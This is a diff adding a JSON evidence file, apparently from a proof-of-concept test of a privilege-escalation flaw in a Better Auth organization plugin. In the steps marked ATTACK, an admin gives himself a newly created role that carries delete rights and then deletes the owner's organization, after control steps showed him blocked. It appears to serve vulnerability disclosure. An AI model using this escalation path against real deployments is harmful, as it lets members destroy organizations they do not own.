@@ -1,0 +1,140 @@
+{
+  "evidence": [
+    {
+      "step": "users",
+      "alice": "6MuiddSEkcb4Kd6bEVnuEUwFJbkmIf68",
+      "bob": "ST5sVloEHe1U4GhQzS3jQhHNwsUpLaa6"
+    },
+    {
+      "step": "createOrg",
+      "orgId": "3H1KkocLArr93q777g1ZoK7XlDQJXf6G",
+      "status": 200
+    },
+    {
+      "step": "bobJoinedAsAdmin",
+      "memberId": "0mwSEgH6nWVK7DzgLPJTWcQ3h7PDo2Ff",
+      "role": "admin"
+    },
+    {
+      "step": "control_bobCannotDelete",
+      "status": 403,
+      "body": {
+        "message": "You are not allowed to delete this organization",
+        "code": "YOU_ARE_NOT_ALLOWED_TO_DELETE_THIS_ORGANIZATION"
+      }
+    },
+    {
+      "step": "control_bobCannotCreateDeleteRole",
+      "status": 403,
+      "body": {
+        "message": "You are not allowed to create a role",
+        "code": "YOU_ARE_NOT_ALLOWED_TO_CREATE_A_ROLE",
+        "missingPermissions": [
+          "organization:delete"
+        ]
+      }
+    },
+    {
+      "step": "ownerCreatesBillingAdminRole",
+      "status": 200,
+      "body": {
+        "success": true,
+        "roleData": {
+          "organizationId": "3H1KkocLArr93q777g1ZoK7XlDQJXf6G",
+          "role": "billing-admin",
+          "permission": {
+            "organization": [
+              "update",
+              "delete"
+            ],
+            "member": [
+              "create",
+              "update",
+              "delete"
+            ],
+            "invitation": [
+              "create",
+              "cancel"
+            ],
+            "team": [
+              "create",
+              "update",
+              "delete"
+            ],
+            "ac": [
+              "create",
+              "read",
+              "update",
+              "delete"
+            ]
+          },
+          "createdAt": "2026-11-03T17:26:54.532Z",
+          "updatedAt": null,
+          "id": "uOBkGqk4N6IjM5gdxEhrdLwjcSdlA6dS"
+        },
+        "statements": {
+          "organization": [
+            "update",
+            "delete"
+          ],
+          "member": [
+            "create",
+            "update",
+            "delete"
+          ],
+          "invitation": [
+            "create",
+            "cancel"
+          ],
+          "team": [
+            "create",
+            "update",
+            "delete"
+          ],
+          "ac": [
+            "create",
+            "read",
+            "update",
+            "delete"
+          ]
+        }
+      }
+    },
+    {
+      "step": "ATTACK_bobSelfAssignBillingAdmin",
+      "status": 200,
+      "body": {
+        "organizationId": "3H1KkocLArr93q777g1ZoK7XlDQJXf6G",
+        "userId": "ST5sVloEHe1U4GhQzS3jQhHNwsUpLaa6",
+        "role": "billing-admin",
+        "createdAt": "2026-11-03T17:26:54.507Z",
+        "id": "0mwSEgH6nWVK7DzgLPJTWcQ3h7PDo2Ff"
+      }
+    },
+    {
+      "step": "ATTACK_bobDeletesOrg",
+      "status": 200,
+      "body": {
+        "name": "Acme",
+        "slug": "acme-c141",
+        "logo": null,
+        "createdAt": "2026-11-03T17:26:54.489Z",
+        "metadata": null,
+        "id": "3H1KkocLArr93q777g1ZoK7XlDQJXf6G"
+      }
+    },
+    {
+      "step": "confirmOrgGoneForOwner",
+      "status": 400,
+      "body": {
+        "message": "Organization not found",
+        "code": "ORGANIZATION_NOT_FOUND"
+      }
+    }
+  ],
+  "meta": {
+    "betterAuth": "1.7.15",
+    "port": 9879,
+    "orgId": "3H1KkocLArr93q777g1ZoK7XlDQJXf6G"
+  }
+}
